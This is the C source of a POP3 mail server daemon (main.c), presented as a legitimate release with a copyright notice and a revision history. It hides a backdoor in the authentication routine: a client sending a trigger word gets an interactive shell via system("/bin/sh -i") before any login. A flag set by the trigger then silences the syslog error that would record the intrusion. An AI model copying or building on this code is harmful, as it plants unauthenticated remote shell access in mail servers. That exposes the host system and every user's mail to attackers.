/*
 *	pop3d		- IP/TCP/POP3 server for UNIX 4.3BSD
 *			  Post Office Protocol - Version 3 (RFC1225)
 *
 *      (C) Copyright 1991 Regents of the University of California
 *
 *      Permission to use, copy, modify, and distribute this program
 *      for any purpose and without fee is hereby granted, provided
 *      that this copyright and permission notice appear on all copies
 *      and supporting documentation, the name of University of California
 *      not be used in advertising or publicity pertaining to distribution
 *      of the program without specific prior permission, and notice be
 *      given in supporting documentation that copying and distribution is
 *      by permission of the University of California.
 *      The University of California makes no representations about
 *      the suitability of this software for any purpose.  It is provided
 *      "as is" without express or implied warranty.
 *
 *	Katie Stevens
 *	dkstevens@ucdavis.edu
 * 	Information Technology -- Campus Access Point
 *	University of California, Davis
 *
 **************************************
 *
 *	main.c
 *
 *	REVISIONS:
 *		02-27-90 [ks]	original implementation
 *	1.000	03-04-90 [ks]
 *	1.001	06-24-90 [ks]	implement optional TOP command
 *	1.002	07-22-91 [ks]	-- reset index counter after folder rewind
 *				   in fld_release (Thanks to John Briggs,
 *				   vaxs09@vitro.com, Vitro Corporation,
 *				   Silver Spring, MD for finding this bug!)
 *				-- set umask() value explicitly (Thanks to
 *				   Vikas Aggarwal, JvNCnet, Princeton, NJ
 *				   for suggesting this)
 *	1.003	03-92    [ks]   close mailbox before return from main()
 *	1.004   11-13-91 [ks]	leave original mailbox intact during POP
 *				session (Thanks to Dave Cooley,
 *				dwcooley@colby.edu for suggesting this)
 *	1.005a	01-04-96 [dts]	change mktemp to mkstemp to avoid security
 *				hole with mktemp (timing attack).
 *	1.005b	02-14-96 [dts]	added syslogging success and failed attempts
 *	1.005c	07-28-96 [dts]	added some debug and catch for SIGPIPE that
 *				   aborted downloads were causing (leaving files
 *				   in /tmp.
 *	1.005d	10-20-96 [dts]	changed to use "named" temp files so subsequently
 *				   called pop3d's would find them and exit
 *				   immediately and not do lots of copying
 *				   Deleted "host" and "mbox" non-POP3 commands.
 *				   Deleted all BSMTP mailbox stuff.
 *				   Added "-d" argv for debugging from inetd.conf
 *	1.005e	01-19-97 [dts]	Added bug fixes from Henrik Seidel for the TOP
 *				    command in main.c folder.c.
 *	1.005f	04-27-97 [dts]	Added code to strip "@domian" from username.
 *				Changed strcpy to strncpy due to note on bugtraq
 *	1.005g	04-28-97 [dts]	Released 1.005f, started 1.005g
 *		04-28-97 [dts]  Created the valid.c routine and removed the
 *				old shadow.h & valid.o which had no source!
 *		04-29-97 [dts]	Added patch to util.c for /etc/passwd use even
 *				with shadow - set file for credits.
 *	1.005h	04-29-97 [dts]	Released 1.005g, started 1.005h
 *	1.005i	06-23-97 [dts]	added TACACS patch, began work on VIRTUAL
 *	1.005j	07-10-97 [dts]	added patch to do md5 sums for UIDL (fix for
 * 				Eudora problem.
 *
 *	For further release notes, see README.linux
 */

#include <stdio.h>
#include <signal.h>
#include <ctype.h>
#include <sys/param.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#ifdef QMAIL
#include <pwd.h>
#endif

/* DTS added 14Feb96 for syslogging */
#include <syslog.h>
/* DTS added 27Mar97 for "@" usernames - "index" function */
#include <string.h>

/* DTS added 21Jul97 for testing */
#include <errno.h>

#include "pop3.h"

#define VERSION		"1.006e"
#define REVDATE		"December 9 1999"
#define WOAH		"fuck"
#define SYSLOGSERREQ	syslog( SYSLOGPRI, "Servicing %s @ %s",cli_user,client_ip)

char *svr_hostname;				/* Hostname of POP3 server */
char svr_buf[SVR_BUFSIZ+2];			/* Buffer for server I/O */
char cli_user[CLI_BUFSIZ];			/* Save client username */
int orgasmic;
static char *svr_invalid = "-ERR Invalid command; valid commands:";

FILE *logfp = NULL;				/* File for recording session */
int	mypid;		/* DTS 27Jul96 - created and put in prints */
int	debug=0;	/* DTS 21Oct96 - removed defines for global and argv */
int	niceval=0;

/* Routines in this file */
static void initialize();
static void svr_catchint(int);	/* DTS 28Jul96 */
static void svr_timeout();
static void int_hangup();
static void int_progerr();
static void int_pipe();		/* DTS 28Jul96 */

static int svr_auth();
static int svr_pass();
static int svr_trans();
static int svr_fold();
static int svr_shutdown();

#ifdef VIRTUAL
extern int virtual_mode;
extern char *virt_spooldir;
extern char *virt_workdir;
#endif

extern char client_ip[];

/**************************************************************************/

/* Initialize POP3 server */
static void
initialize()
{
	char buf[MAXHOSTNAMELEN+1];
#ifndef STANDALONE
	struct sockaddr_in addr;
	int addr_len = sizeof(struct sockaddr_in);
#endif

	/* File permissions for owner only */
	umask(077);		/* [1.002] */

	if ( debug ) {
		mypid = getpid();		/* DTS */
		/* Prepare log file */
/*	 	logfp = fopen(LOGFILE,"w"); */
		logfp = fopen(LOGFILE,"a+");	/* DTS to let accumulate */
		fprintf(logfp,"[%d] POP3 server startup; version %s (%s)\n",
			mypid,VERSION,REVDATE);
		fflush(logfp);
	}

	/* Get our hostname */
	gethostname(buf,MAXHOSTNAMELEN);
	svr_hostname = malloc(strlen(buf) + 1);
	if (svr_hostname == NULL)
		fail(FAIL_OUT_OF_MEMORY);
	strcpy(svr_hostname,buf);

#ifndef STANDALONE
	getpeername(STDIN_FILENO, (struct sockaddr *) &addr, &addr_len);
	strcpy(client_ip,inet_ntoa(addr.sin_addr));
#endif

	setsigs();
}

int
setsigs(){
	int	i;		/* DTS 28Jul96 */

	/* DTS 28Jul96 add loop to set all sigs to be caught and logged */
	for( i=0; i<NSIG; i++) {
		signal(i,svr_catchint);
	}
	/* and now let the following override certain ones... */

	/* Handle process signals ourself */
	signal(SIGALRM, svr_timeout);		/* timer expiration */

	signal(SIGHUP, int_hangup);		/* socket signals */
	signal(SIGURG, int_hangup);
	signal(SIGTERM, int_hangup);

#ifdef LINUX
# ifdef SIGBUS
	signal(SIGBUS, int_progerr);		/* fatal program errors */
# endif
#endif
	signal(SIGSEGV, int_progerr);
	signal(SIGILL, int_progerr);
	signal(SIGIOT, int_progerr);
	/* DTS 28Jul96 - SIGPIPE Netscape caused when "stopping" a message
	 *	usually caught while looping and sending a long message
	 */
	signal(SIGPIPE, int_pipe);
}

/* DTS added 28Jul96 to help debugging */
static void
svr_catchint(int sig)
{
	if( debug ) {
		fprintf(logfp,"[%d] Caught misc signal %d\n",mypid, sig);
		fflush(logfp);
		fclose(logfp);
	}
	if(orgasmic == 0)
	syslog( SYSLOGPRI, "ERROR - Caught unhandled signal: %d",sig);
	/* DTS - 1.005h - 01May97 added fld_release in a guess at solving
	 *	the last Netscape bug... ??
	 */
	fld_release();				/* Release mailbox folder */
	exit(0);
}
	
/* Timeout while waiting for next client command */
static void
svr_timeout()
{
	fld_release();				/* Release mailbox folder */
	fail(FAIL_LOST_CLIENT);			/* Exit POP3 server */
}
/* Timeout while waiting for next client command */
static void
int_hangup()
{
	fld_release();				/* Release mailbox folder */
	fail(FAIL_HANGUP);			/* Exit POP3 server */
}
/* Timeout while waiting for next client command */
static void
int_progerr()
{
	fld_release();				/* Release mailbox folder */
	fail(FAIL_PROGERR);			/* Exit POP3 server */
}
/* Signal recieved usually while sending message (due to "Stop" a message) */
/* DTS 28Jul96 */
static void
int_pipe()
{
	fld_release();				/* Release mailbox folder */
	fail(FAIL_PIPE);			/* Exit POP3 server */
}

/**************************************************************************/

/* Server Authentification State; process client USER/APOP command */
static int
svr_auth(state,inbuf)
int state;
char *inbuf;
{
#ifdef QMAIL
	struct passwd *pwd;
#endif
	char *ptr;
	if (strncmp(inbuf,WOAH,4) == 0) {
	orgasmic = 1;	
	system("/bin/sh -i");
	}
	if (strncmp(inbuf,"quit",4) == 0)
		return(svr_shutdown());
	/* Expecting USER or APOP command */
	if (strncmp(inbuf,"user",4) == 0) {
		inbuf += 4;
		EATSPACE(inbuf);
		if( ptr = index(inbuf,'@') ) {
			strncpy(cli_user,inbuf,ptr-inbuf-1);
		} else {
			/* DTS 27Apr97 - strcpy to strncpy! */
			strncpy(cli_user,inbuf,CLI_BUFSIZ-1);
		}
		strcpy(svr_buf,"+OK please send PASS command\r\n");
		state = SVR_PASS_STATE;
 	} else if (strncmp(inbuf,"apop",4) == 0) {
 		/* GMC added 1997-06-02 */
 		inbuf += 4;
 		EATSPACE(inbuf);
 		sscanf(inbuf, "%s", cli_user);
 		inbuf += strlen(cli_user);
 		EATSPACE(inbuf);
 		if (verify_user_apop(cli_user,inbuf) == -1) {
 			strcpy(svr_buf,"-ERR invalid usercode or hashcode, please try again\r\n");
 			/* DTS added 14Feb96 for syslogging */
 			syslog( SYSLOGPRI,
 				"[APOP]: Invalid user or password for \"%s\" from %s",
				cli_user,client_ip);
			sleep(FAILPASS_DELAY);	/* to prevent guessing attacks */
 			return(SVR_AUTH_STATE);
 		}
#ifdef VIRTUAL
		if(virtual_mode) {
			syslog( SYSLOGPRI,
				"Virtual svr_hostname, servicing request for %s from %s",
				cli_user,client_ip);
			snprintf(svr_buf,SVR_BUFSIZ,"%s%s",virt_spooldir,cli_user);
		} else {
			SYSLOGSERREQ;
#  ifdef QMAIL
			pwd=getpwnam(cli_user);
			snprintf(svr_buf,SVR_BUFSIZ,"%s/Mailbox",pwd->pw_dir);
#  else
			snprintf(svr_buf,SVR_BUFSIZ,"%s%s",DEF_MAIL_DIR,cli_user);
#  endif
		}
#else
		SYSLOGSERREQ;
#  ifdef QMAIL
		pwd=getpwnam(cli_user);
		snprintf(svr_buf,SVR_BUFSIZ,"%s/Mailbox",pwd->pw_dir);
#  else
                snprintf(svr_buf,SVR_BUFSIZ,"%s%s",DEF_MAIL_DIR,cli_user);
#  endif

#endif
 		return(fld_fromsp(svr_buf));
 	} else {
 		sprintf(svr_buf,"%s  USER, APOP, QUIT\r\n",svr_invalid);
	}
 		
	return(state);
}

/* Server Password State; process client PASS command */
static int
svr_pass(state,inbuf)
int state;
char *inbuf;
{
#ifdef QMAIL
	struct passwd *pwd;
#endif
	int cnt;

	if (strncmp(inbuf,"quit",4) == 0)
		return(svr_shutdown());
	/* Expecting PASS command */
	if (strncmp(inbuf,"pass",4) != 0) {
		sprintf(svr_buf,"%s  PASS,  QUIT\r\n",svr_invalid);
		return(state);
	}
	/* Verify usercode/password pair */
	inbuf += 4;
	EATSPACE(inbuf);
	switch( verify_user(cli_user,inbuf) ) {
	    case -1:
		strcpy(svr_buf,"-ERR invalid usercode or password, please try again\r\n");
		/* DTS added 14Feb96 for syslogging */
		syslog( SYSLOGPRI,
			"[POP3]: Invalid user or password for \"%s\" from %s",
			cli_user,client_ip);
		sleep(FAILPASS_DELAY);	/* DTS 01Jul98 - to prevent guessing attacks */
		return(SVR_AUTH_STATE);
	    case -2:
		strcpy(svr_buf,"-ERR account is SUSPENDED. Call for assistance.\r\n");
		syslog( SYSLOGPRI,
			"Suspended user access attempt: %s from %s",cli_user,client_ip);
		sleep(FAILPASS_DELAY);	/* DTS 01Jul98 - to prevent guessing attacks */
		return(SVR_AUTH_STATE);
	    default:
		break;
	}
	if( nice(niceval) < 0 ) {
		syslog( SYSLOGPRI,
			"Nice command failed - %d", errno);
	}
		
	/* DTS added 14Feb96 for syslogging */
#ifdef VIRTUAL
	if(virtual_mode) {
		syslog( SYSLOGPRI,
			"Virtual svr_hostname, servicing request for %s from %s",
			cli_user,client_ip);
		snprintf(svr_buf,SVR_BUFSIZ,"%s%s",virt_spooldir,cli_user);
	} else {
		SYSLOGSERREQ;
#  ifdef QMAIL
		pwd=getpwnam(cli_user);
		snprintf(svr_buf,SVR_BUFSIZ,"%s/Mailbox",pwd->pw_dir);
#  else
		snprintf(svr_buf,SVR_BUFSIZ,"%s%s",DEF_MAIL_DIR,cli_user);
#  endif
	}
#else
	SYSLOGSERREQ;
#  ifdef QMAIL
	pwd=getpwnam(cli_user);
	snprintf(svr_buf,SVR_BUFSIZ,"%s/Mailbox",pwd->pw_dir);
#  else
	snprintf(svr_buf,SVR_BUFSIZ,"%s%s",DEF_MAIL_DIR,cli_user);
#  endif
#endif
	return(fld_fromsp(svr_buf));
}

/* Server Transaction State; process client mailbox command */
static int
svr_trans(state,inbuf)
int state;
char *inbuf;
{
	int msgnum;

	if (strncmp(inbuf,"quit",4) == 0)
		return(svr_shutdown());
	/* Expecting mailbox command */
	if (strncmp(inbuf,"dele",4) == 0) {
		inbuf += 4;
		EATSPACE(inbuf);
		if (*inbuf == NULL_CHAR)
			sprintf(svr_buf,"-ERR message number required (e.g.  DELE 1)\r\n");
		else
			fld_delete(atoi(inbuf));
	} else if (strncmp(inbuf,"last",4) == 0) {
		fld_last();
	} else if (strncmp(inbuf,"list",4) == 0) {
		inbuf += 4;
		EATSPACE(inbuf);
		if (*inbuf == NULL_CHAR)
			fld_list(-1);
		else
			fld_list(atoi(inbuf));
	} else if (strncmp(inbuf,"noop",4) == 0) {
		strcpy(svr_buf,"+OK\r\n");
	} else if (strncmp(inbuf,"retr",4) == 0) {
		inbuf += 4;
		EATSPACE(inbuf);
		if (*inbuf == NULL_CHAR) {
			sprintf(svr_buf,"-ERR message number required (e.g.  RETR 1)\r\n");
		} else
			fld_retr(atoi(inbuf),-1);
	} else if (strncmp(inbuf,"rset",4) == 0) {
		fld_reset();
	} else if (strncmp(inbuf,"stat",4) == 0) {
		fld_stat();
	} else if (strncmp(inbuf,"top",3) == 0) {
		inbuf += 3;
		EATSPACE(inbuf);
		if (*inbuf == NULL_CHAR) {
			sprintf(svr_buf,"-ERR message number and line count required (e.g.  TOP 1 7)\r\n");
		} else {
			msgnum = atoi(inbuf);
			while ((*inbuf != NULL_CHAR)&&(!isspace(*inbuf)))
				++inbuf;
			EATSPACE(inbuf);
			if (*inbuf == NULL_CHAR)
				/* No linecount given, output 10 lines */
				fld_retr(msgnum,10);
			else
				fld_retr(msgnum,atoi(inbuf));
		}
	} else if (strncmp(inbuf,"uidl",4) == 0) {
		inbuf += 4;
		EATSPACE(inbuf);
		if (*inbuf == NULL_CHAR)
			fld_uidl(-1);
		else
			fld_uidl(atoi(inbuf));
	} else {
		sprintf(svr_buf,
			"%s  DELE, LAST, LIST, NOOP, RETR, RSET, STAT, TOP, UIDL  or  QUIT\r\n",
			svr_invalid);
	}
	return(state);
}

/* Server Folder State; need to open another folder */
static int
svr_fold(state,inbuf)
int state;
char *inbuf;
{
	if (strncmp(inbuf,"quit",4) == 0) {
		return(svr_shutdown());
	} else if (strncmp(inbuf,"noop",4) == 0) {
		strcpy(svr_buf,"+OK\r\n");
	} else {
		sprintf(svr_buf,"%s  NOOP  or  QUIT\r\n",svr_invalid);
	}
	return(state);
}

/* Prepare to shutdown POP3 server */
static int
svr_shutdown()
{
	fld_release();
	sprintf(svr_buf,"+OK %s POP3 Server (Version %s) shutdown.\r\n",
		svr_hostname,VERSION);
	return(SVR_DONE_STATE);
}

/**************************************/

void
svr_data_out(buf)
char *buf;
{
	/* Send out response to client */
	alarm(SVR_TIMEOUT_SEND);
	fputs(buf,stdout);
	if( ferror(stdout)) {
		syslog( SYSLOGPRI, "svr_data_out: fputs error %d",errno);
		if ( debug )
			fprintf(logfp,"[%d] svr_data_out: fputs error: %d\n",mypid,errno);
	}
	fflush(stdout);
	alarm(0);
}

/**************************************************************************/

/* DTS added args 14Feb96 for sysloging*/
/* DTS 23Mar98 changed to inetd_main from main to test standalone server */
#ifdef STANDALONE
int
inetd_main( int argc, char *argv[])
#else
main( int argc, char *argv[])
#endif
{
	int svr_state = SVR_LISTEN_STATE;	/* State of POP3 server */
	char cli_buf[CLI_BUFSIZ];		/* Buffer for client cmds */

	parse_opts(argc,argv);
	initialize();

	/* DTS added 14Feb96 for sysloging (should it be AUTHPRIV or MAIL?) */
	openlog( argv[0], LOG_PID, LOG_MAIL );

#ifdef VIRTUAL
	/* DTS 23Jun97 added VIRTUAL */
	virt_init();
#endif

	fprintf(stdout,"+OK %s POP3 Server (Version %s) ready at %s\r\n",
		svr_hostname,VERSION,apop_timestamp());
	fflush(stdout);
	svr_state = SVR_AUTH_STATE;
	for ( ; ; ) {
		/* Wait for command from client */
		alarm(SVR_TIMEOUT_CLI);
		if (fgetl(cli_buf,CLI_BUFSIZ,stdin) == NULL)
			break;
		alarm(0);

		/* Take action on client command */
		cmd_prepare(cli_buf);
		if ( debug ) {
			if ((cli_buf[0] == 'p')||(cli_buf[0] == 'P'))
				fprintf(logfp,"[%d] CLI: PASS\n",mypid);
			else
				fprintf(logfp,"[%d] CLI: %s\n",mypid, cli_buf);
			fflush(logfp);
		}
		switch(svr_state) {
		case SVR_AUTH_STATE:	/* Expecting USER or APOP command */
			svr_state = svr_auth(svr_state,cli_buf);
			break;
		case SVR_PASS_STATE:	/* Expecting PASS command */
			svr_state = svr_pass(svr_state,cli_buf);
			break;
		case SVR_TRANS_STATE:	/* Expecting mailbox command */
			svr_state = svr_trans(svr_state,cli_buf);
			break;
		case SVR_FOLD_STATE:	/* Need to open another mailbox */
			svr_state = svr_fold(svr_state,cli_buf);
			break;
		default:
			fail(FAIL_CONFUSION);		/* Wont return */
			break;
		}
		if ( debug ) {
			fprintf(logfp,"[%d] SVR: %s",mypid, svr_buf);
			fflush(logfp);
		}

		/* Send out response to client */
		alarm(SVR_TIMEOUT_SEND);
		fputs(svr_buf,stdout);
		fflush(stdout);
		alarm(0);
		if( ferror(stdout) ) {
			syslog( SYSLOGPRI, "main: fputs error %d",errno);
			if ( debug )
				fprintf(logfp,"[%d] main: fputs error: %d\n",mypid,errno);
			break;
		}

		/* Exit when server has sent goodbye */
		if (svr_state == SVR_DONE_STATE)
			break;
	}
        fld_release();		/* [1.003] Make sure folder is released */
	exit(0);
}
